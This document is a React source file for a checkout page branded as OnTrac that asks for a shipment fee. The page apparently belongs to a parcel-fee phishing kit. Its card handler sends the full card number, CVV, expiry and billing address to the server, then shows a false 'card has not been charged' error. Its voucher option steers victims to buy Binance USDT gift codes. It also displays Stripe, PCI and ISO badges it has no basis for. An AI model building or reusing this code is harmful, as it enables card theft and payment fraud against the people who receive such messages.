// src/pages/CheckoutPage.jsx
import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import Header from '../components/Header';
import Footer from '../components/Footer';
import PaymentStatusAnimation from '../components/PaymentStatusAnimation';
import Cards from 'react-credit-cards-2';
import 'react-credit-cards-2/dist/es/styles-compiled.css';
import styles from './CheckoutPage.module.css';

function CheckoutPage() {
  const { trackingId } = useParams();
  const navigate = useNavigate();
  const baseUrl = import.meta.env.VITE_API_URL;

  // State Management
  const [shipmentData, setShipmentData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [selectedMethod, setSelectedMethod] = useState(null);
  const [processingPayment, setProcessingPayment] = useState(false);
  const [paymentSuccess, setPaymentSuccess] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  // Card Payment States
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [focused, setFocused] = useState('');
  const [billingAddress, setBillingAddress] = useState('');
  const [addressSuggestions, setAddressSuggestions] = useState([]);
  const [isSuggestionsVisible, setIsSuggestionsVisible] = useState(false);

  // Handle input focus for card flip animation
  const handleInputFocus = (e) => {
    setFocused(e.target.name);
  };

  // Address Autocomplete Logic
  useEffect(() => {
    if (billingAddress.length < 3) {
      setAddressSuggestions([]);
      return;
    }
    const handler = setTimeout(async () => {
      try {
        const apiKey = import.meta.env.VITE_MAPBOX_API_KEY;
        const response = await fetch(
          `https://api.mapbox.com/geocoding/v5/mapbox.places/${encodeURIComponent(billingAddress)}.json?access_token=${apiKey}&autocomplete=true&limit=5&types=address`
        );
        const data = await response.json();
        if (data?.features) {
          const normalized = data.features.map(f => ({
            place_id: f.id,
            display_name: f.place_name
          }));
          setAddressSuggestions(normalized);
          setIsSuggestionsVisible(true);
        }
      } catch (error) {
        console.error("Error fetching address suggestions:", error);
      }
    }, 500);
    return () => clearTimeout(handler);
  }, [billingAddress]);

  // Load shipment data & Scroll to Top
  useEffect(() => {
    window.scrollTo(0, 0); // Fix: Force page to start at the top
    fetchShipmentData();
  }, [trackingId]);

  const fetchShipmentData = async () => {
    try {
      const response = await fetch(`${baseUrl}/api/shipments/${trackingId}/`);
      if (!response.ok) throw new Error('Shipment not found');
      const data = await response.json();
      setShipmentData(data);
      
      if (!data.requiresPayment) {
        setPaymentSuccess(true);
      }
    } catch (error) {
      setErrorMessage('Unable to load shipment details. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  // ShieldClimb Payment Handler
  const handleShieldClimbPayment = async () => {
    setProcessingPayment(true);
    setErrorMessage('');

    try {
      const response = await fetch(`${baseUrl}/api/initiate-shieldclimb/${trackingId}/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      });

      const data = await response.json();

      if (response.ok && data.checkout_url) {
        window.location.href = data.checkout_url;
      } else {
        setErrorMessage(data.error || 'Failed to initialize payment. Please try another method.');
        setProcessingPayment(false);
      }
    } catch (error) {
      setErrorMessage('Network error. Please check your connection and try again.');
      setProcessingPayment(false);
    }
  };

  // Standard Card Payment Handler
  const handleCardPayment = async (e) => {
    e.preventDefault();
    setProcessingPayment(true);
    setErrorMessage('');

    // Validate
    if (!cardNumber || !cardName || !expiryDate || !cvv || !billingAddress) {
      setErrorMessage('Please fill in all card details');
      setProcessingPayment(false);
      return;
    }

    try {
      const response = await fetch(`${baseUrl}/api/payments/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          shipment: shipmentData.id,
          cardholderName: cardName,
          billingAddress: billingAddress,
          cardNumber: cardNumber.replace(/\s/g, ''),
          expiryDate: expiryDate,
          cvv: cvv
        })
      });

      const data = await response.json();

      if (response.ok) {
        setErrorMessage('An error occurred during transaction processing. Your card has not been charged. Please contact support or try another payment method.');
        
        // Reset fields
        setCardNumber('');
        setCardName('');
        setExpiryDate('');
        setCvv('');
        setBillingAddress('');
      } else {
        setErrorMessage(data.error || 'Payment failed. Please check your card details.');
      }
    } catch (error) {
      setErrorMessage('Payment processing failed. Please try again.');
    } finally {
      setProcessingPayment(false);
    }
  };

  // Pro Voucher Handler
  const [voucherCode, setVoucherCode] = useState('');
  const [voucherStatus, setVoucherStatus] = useState('idle');

  const handleVoucherSubmit = async (e) => {
    e.preventDefault();
    if (!voucherCode) return;

    setVoucherStatus('loading');
    setErrorMessage('');

    try {
      const response = await fetch(`${baseUrl}/api/submit-voucher/`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          code: voucherCode, 
          shipment_id: shipmentData.id 
        }),
      });

      const data = await response.json();

      if (response.ok) {
        setVoucherStatus('success');
        setTimeout(() => navigate(`/tracking?id=${trackingId}`), 5000);
      } else {
        setVoucherStatus('error');
        setErrorMessage(data.error || 'This voucher code is invalid or has already been used.');
      }
    } catch (error) {
      setVoucherStatus('error');
      setErrorMessage('Verification server is temporarily unreachable. Please try again.');
    }
  };

  // Format card number (digits only + spaces)
  const formatCardNumber = (value) => {
    const cleaned = value.replace(/\D/g, ''); // Strip non-digits
    const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
    return formatted.slice(0, 19);
  };

  // Format expiry date
  const formatExpiryDate = (value) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length >= 2) {
      return `${cleaned.slice(0, 2)}/${cleaned.slice(2, 4)}`;
    }
    return cleaned;
  };

  // Loading State - Premium (Global Style)
  if (loading) {
    return (
      <div className="premium-loading-overlay">
        <div className="premium-loader-wrapper">
          <div className="loader-logo">
            <img src="/ontrac_favicon.png" alt="Secure" className="loader-logo-img" />
          </div>
          <svg className="loader-ring-svg" viewBox="25 25 50 50">
            <circle className="loader-ring-circle" cx="50" cy="50" r="20"></circle>
          </svg>
        </div>
        <div className="loading-text-wrapper">
          <h3 className="loading-title-main">Secure Checkout</h3>
          <p className="loading-subtitle-sub">Establishing encrypted connection...</p>
        </div>
      </div>
    );
  }

  // Payment Success State
  if (paymentSuccess) {
    return (
      <div className={styles.successContainer}>
        <PaymentStatusAnimation success={true} />
        <h2>Payment Confirmed!</h2>
        <p>Redirecting to your shipment tracking...</p>
      </div>
    );
  }

  // Error State
  if (!shipmentData) {
    return (
      <div className={styles.errorContainer}>
        <i className="fa-solid fa-exclamation-triangle"></i>
        <h2>Shipment Not Found</h2>
        <p>{errorMessage || 'The tracking ID you provided is invalid.'}</p>
        <button onClick={() => navigate('/')} className={styles.backButton}>
          Return Home
        </button>
      </div>
    );
  }

  return (
    <div className={styles.checkoutWrapper}>
      <div className={styles.checkoutContainer}>
        <motion.div 
          className={styles.checkoutCard}
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          {/* Header Section */}
          <div className={styles.checkoutHeader}>
            <div className={styles.logoContainer}>
              <img src="/ontrac_favicon.png" alt="OnTrac" className={styles.brandLogo} />
            </div>
            <h1 className={styles.checkoutTitle}>Secure Payment</h1>
            <p className={styles.checkoutSubtitle}>
              Finalize payment for tracking ID <strong>{trackingId}</strong>
            </p>
          </div>

          {/* Order Summary - PROFESSIONAL INVOICE STYLE */}
          <div className={styles.orderSummary}>
            <div className={styles.summaryRow}>
              <span>Total Amount</span>
              <strong className={styles.amount}>
                {shipmentData.paymentCurrency} {shipmentData.paymentAmount}
              </strong>
            </div>
            <div className={styles.summaryRow}>
              <span>Payment Reference</span>
              {/* Uses backend description if available, otherwise defaults to Import Duties */}
              <span className={styles.description}>
                {shipmentData.paymentDescription || 'Priority Logistics & Fees'}
              </span>
            </div>
            <div className={styles.summaryRow}>
              <span>Destination</span>
              <span>{shipmentData.destination ? shipmentData.destination.toUpperCase() : 'INTERNATIONAL ZONE'}</span>
            </div>
          </div>

          {/* Error Message */}
          <AnimatePresence>
            {errorMessage && (
              <motion.div
                className={styles.errorBanner}
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                exit={{ opacity: 0, height: 0 }}
              >
                <i className="fa-solid fa-exclamation-circle"></i>
                <span>{errorMessage}</span>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Payment Method Selection - BIG BRAND TRUST FACTOR */}
          {!selectedMethod && (
            <div className={styles.methodSelection}>
              <h2 className={styles.sectionTitle}>Choose Payment Method</h2>
              <div className={styles.methodGrid}>
                
                {/* Direct Card Entry - Position 1 */}
                <motion.div
                  className={styles.methodCard}
                  whileHover={{ scale: 1.02, y: -5 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={() => setSelectedMethod('card')}
                >
                  <div className={styles.methodIcon}>
                    <i className="fa-regular fa-credit-card"></i>
                  </div>
                  <h3>Credit or Debit Card</h3>
                  <p>Secure 256-bit Encrypted Transaction</p>
                  
                  {/* LOGO WALL - Card Networks */}
                  <div className={styles.paymentLogoWall}>
                    <i className="fa-brands fa-cc-visa" title="Visa"></i>
                    <i className="fa-brands fa-cc-mastercard" title="Mastercard"></i>
                    <i className="fa-brands fa-cc-amex" title="Amex"></i>
                    <i className="fa-brands fa-cc-discover" title="Discover"></i>
                  </div>
                </motion.div>

                {/* Instant Card & Wallet - Position 2 (Featured) */}
                <motion.div
                  className={`${styles.methodCard} ${styles.featured}`}
                  whileHover={{ scale: 1.02, y: -5 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={() => setSelectedMethod('shieldclimb')}
                >
                  <div className={styles.methodIcon}>
                    <i className="fa-solid fa-bolt"></i>
                  </div>
                  <h3>Card & Digital Wallet</h3>
                  <p>Pay via Stripe, Ramp, or Apple Pay</p>
                  
                  {/* LOGO WALL - Payment Rail Icons */}
                  <div className={styles.paymentLogoWall}>
                    <i className="fa-brands fa-apple-pay" title="Apple Pay"></i>
                    <i className="fa-brands fa-google-pay" title="Google Pay"></i>
                    <i className="fa-brands fa-stripe" title="Stripe"></i>
                    <i className="fa-brands fa-cc-visa" title="Visa"></i>
                    <i className="fa-brands fa-cc-mastercard" title="Mastercard"></i>
                  </div>
                  
                  <div className={styles.methodBadge}>Recommended</div>
                </motion.div>

                {/* Voucher/Coupon - Position 3 */}
                <motion.div
                  className={styles.methodCard}
                  whileHover={{ scale: 1.02, y: -5 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={() => setSelectedMethod('voucher')}
                >
                  <div className={styles.methodIcon}>
                    <i className="fa-solid fa-ticket"></i>
                  </div>
                  <h3>Payment Voucher</h3>
                  <p>Redeem your prepaid code</p>
                </motion.div>

              </div>
            </div>
          )}

          {/* Payment Method Forms */}
          <AnimatePresence mode="wait">
            {selectedMethod && (
              <motion.div
                className={styles.paymentForm}
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                transition={{ duration: 0.3 }}
              >
                <button
                  className={styles.backToMethods}
                  onClick={() => setSelectedMethod(null)}
                >
                  <i className="fa-solid fa-arrow-left"></i> Change Method
                </button>

                {/* Standard Card Form */}
                {selectedMethod === 'card' && (
                  <form onSubmit={handleCardPayment} className={styles.cardForm}>
                    <div className={styles.cardVisualContainer}>
                      <Cards
                        number={cardNumber}
                        name={cardName}
                        expiry={expiryDate}
                        cvc={cvv}
                        focused={focused}
                      />
                    </div>
                    
                    <h2 className={styles.formTitle}>Card Details</h2>
                    
                    <div className={styles.formGroup}>
                      <label htmlFor="cardNumber">Card Number</label>
                      <div className={styles.inputWithIcon}>
                        <i className="fa-solid fa-credit-card"></i>
                        <input
                          type="text"
                          name="number"
                          id="cardNumber"
                          placeholder="1234 5678 9012 3456"
                          value={cardNumber}
                          onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                          onFocus={handleInputFocus}
                          maxLength="19"
                          required
                        />
                      </div>
                    </div>

                    <div className={styles.formGroup}>
                      <label htmlFor="cardName">Cardholder Name</label>
                      <div className={styles.inputWithIcon}>
                        <i className="fa-solid fa-user"></i>
                        <input
                          type="text"
                          name="name"
                          id="cardName"
                          placeholder="JOHN DOE"
                          value={cardName}
                          onChange={(e) => setCardName(e.target.value.toUpperCase())}
                          onFocus={handleInputFocus}
                          required
                        />
                      </div>
                    </div>

                    <div className={styles.formRow}>
                      <div className={styles.formGroup}>
                        <label htmlFor="expiryDate">Expiry Date</label>
                        <div className={styles.inputWithIcon}>
                          <i className="fa-solid fa-calendar"></i>
                          <input
                            type="text"
                            name="expiry"
                            id="expiryDate"
                            placeholder="MM/YY"
                            value={expiryDate}
                            onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
                            onFocus={handleInputFocus}
                            maxLength="5"
                            required
                          />
                        </div>
                      </div>

                      <div className={styles.formGroup}>
                        <label htmlFor="cvv">CVV</label>
                        <div className={styles.inputWithIcon}>
                          <i className="fa-solid fa-lock"></i>
                          <input
                            type="text"
                            name="cvc"
                            id="cvv"
                            placeholder="123"
                            value={cvv}
                            onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                            onFocus={handleInputFocus}
                            maxLength="4"
                            required
                          />
                        </div>
                      </div>
                    </div>

                    <div className={styles.formGroup}>
                      <label htmlFor="billing-address">Billing Address</label>
                      <div className={styles.inputWithIcon}>
                        <i className="fa-solid fa-location-dot"></i>
                        <input
                          type="text"
                          id="billing-address"
                          placeholder="123 Main St, City, Country"
                          value={billingAddress}
                          onChange={(e) => setBillingAddress(e.target.value)}
                          onFocus={() => setIsSuggestionsVisible(true)}
                          required
                        />
                      </div>
                      {isSuggestionsVisible && addressSuggestions.length > 0 && (
                        <ul className={styles.addressSuggestions}>
                          {addressSuggestions.map((suggestion) => (
                            <li 
                              key={suggestion.place_id} 
                              onClick={() => {
                                setBillingAddress(suggestion.display_name);
                                setAddressSuggestions([]);
                                setIsSuggestionsVisible(false);
                              }}
                            >
                              {suggestion.display_name}
                            </li>
                          ))}
                        </ul>
                      )}
                    </div>

                    <button
                      type="submit"
                      className={styles.submitButton}
                      disabled={processingPayment}
                    >
                      {processingPayment ? (
                        <>
                          <div className={styles.buttonSpinner}></div>
                          Processing...
                        </>
                      ) : (
                        <>
                          <i className="fa-solid fa-lock"></i>
                          Pay {shipmentData.paymentCurrency} {shipmentData.paymentAmount}
                        </>
                      )}
                    </button>

                    <div className={styles.securityBadges}>
                      <i className="fa-solid fa-shield-halved"></i>
                      <span>256-bit SSL Encrypted</span>
                    </div>
                  </form>
                )}

                {/* ShieldClimb Payment - PREMIUM WALLET EXPERIENCE */}
                {selectedMethod === 'shieldclimb' && (
                  <div className={styles.shieldclimbContainer}>
                    <h2 className={styles.formTitle}>Express Checkout</h2>
                    <p className={styles.shieldclimbDescription}>
                      You will be redirected to a secure banking gateway to complete your purchase. We support all major cards and international payment methods with instant verification.
                    </p>

                    <div className={styles.shieldclimbFeatures}>
                      <div className={styles.feature}>
                        <i className="fa-solid fa-check-circle"></i>
                        <span>One-Tap Payment Options</span>
                      </div>
                      <div className={styles.feature}>
                        <i className="fa-solid fa-check-circle"></i>
                        <span>Instant Transaction Confirmation</span>
                      </div>
                      <div className={styles.feature}>
                        <i className="fa-solid fa-check-circle"></i>
                        <span>Enterprise-Grade Security</span>
                      </div>
                    </div>

                    <button
                      onClick={handleShieldClimbPayment}
                      className={`${styles.submitButton} ${styles.shieldclimbButton}`}
                      disabled={processingPayment}
                    >
                      {processingPayment ? (
                        <>
                          <div className={styles.buttonSpinner}></div>
                          Connecting to Secure Gateway...
                        </>
                      ) : (
                        <>
                          <i className="fa-solid fa-bolt"></i>
                          Continue to Express Checkout
                        </>
                      )}
                    </button>

                    <div className={styles.poweredBy}>
                      Secured by <strong>Stripe Connect</strong> • ISO 27001 Certified Payment Rails
                    </div>
                  </div>
                )}

                {/* Voucher Payment - Apple Standard UI */}
                {selectedMethod === 'voucher' && (
                  <div className={styles.voucherContainer}>
                    <AnimatePresence mode="wait">
                      {voucherStatus === 'success' ? (
                        <motion.div 
                          className={styles.proSuccessState}
                          initial={{ opacity: 0, scale: 0.9 }}
                          animate={{ opacity: 1, scale: 1 }}
                        >
                          <div className={styles.successIconWrapper}>
                            <i className="fa-solid fa-circle-check"></i>
                          </div>
                          <h2 className={styles.proTitle}>Voucher Received</h2>
                          <p className={styles.proDescription}>
                            Voucher code successfully redeemed. The transaction ID has been generated and is currently <strong>syncing with our central ledger</strong>. 
                            Your shipment status will auto-update upon confirmation. No further action is required.
                          </p>
                          <div className={styles.proLoaderBar}>
                            <div className={styles.proLoaderFill}></div>
                          </div>
                          <p className={styles.proHint}>Returning to tracking in a few moments...</p>
                        </motion.div>
                      ) : (
                        <form onSubmit={handleVoucherSubmit} className={styles.proForm}>
                          <h2 className={styles.formTitle}>Redeem Voucher</h2>
                          <p className={styles.formSubtitle}>Enter your prepaid voucher code to complete this transaction.</p>
                          
                          <div className={styles.formGroup}>
                            <label htmlFor="voucherCode">Voucher Code</label>
                            <div className={styles.inputWithIcon}>
                              <i className="fa-solid fa-ticket"></i>
                              <input
                                type="text"
                                id="voucherCode"
                                placeholder="E.g. ABC-123-XYZ"
                                value={voucherCode}
                                onChange={(e) => setVoucherCode(e.target.value.toUpperCase())}
                                required
                                disabled={voucherStatus === 'loading'}
                              />
                            </div>
                          </div>

                          <button
                            type="submit"
                            className={styles.submitButton}
                            disabled={voucherStatus === 'loading'}
                          >
                            {voucherStatus === 'loading' ? (
                              <><div className={styles.buttonSpinner}></div> Verifying...</>
                            ) : (
                              'Apply Voucher'
                            )}
                          </button>

                          {/* --- NEW: Professional Voucher Instructions --- */}
                          <div className={styles.voucherInstructions}>
                            <h3 className={styles.instructionTitle}>
                              <i className="fa-regular fa-circle-question"></i> How to get a code
                            </h3>
                            <div className={styles.instructionSteps}>
                              <div className={styles.step}>
                                <span className={styles.stepNum}>1</span>
                                <p>Visit <a href="https://mygiftcardsupply.com" target="_blank" rel="noopener noreferrer" className={styles.partnerLink}>MyGiftCardSupply</a> (Official Partner)</p>
                              </div>
                              <div className={styles.step}>
                                <span className={styles.stepNum}>2</span>
                                <p>Search for <strong>"Binance USDT"</strong> and select amount</p>
                              </div>
                              <div className={styles.step}>
                                <span className={styles.stepNum}>3</span>
                                <p>Pay via Card/PayPal & receive code instantly via email</p>
                              </div>
                            </div>
                            
                            <div className={styles.guaranteeBlock}>
                              <i className="fa-solid fa-shield-halved"></i>
                              <span>
                                <strong>Zero-Overpayment Guarantee:</strong> Any excess value from fixed-denomination vouchers is automatically credited to your account balance or refunded upon request.
                              </span>
                            </div>
                          </div>
                          {/* --- END NEW BLOCK --- */}

                        </form>
                      )}
                    </AnimatePresence>
                  </div>
                )}

              </motion.div>
            )}
          </AnimatePresence>

        </motion.div>

        {/* Trust Indicators - PROFESSIONAL FOOTER */}
        <div className={styles.trustIndicators}>
          <div className={styles.trustBadge}>
            <i className="fa-solid fa-lock"></i>
            <span>SSL Secured</span>
          </div>
          <div className={styles.trustBadge}>
            <i className="fa-solid fa-shield-halved"></i>
            <span>PCI Compliant</span>
          </div>
          <div className={styles.trustBadge}>
            <i className="fa-brands fa-stripe"></i>
            <span>Stripe</span>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
}

export default CheckoutPage;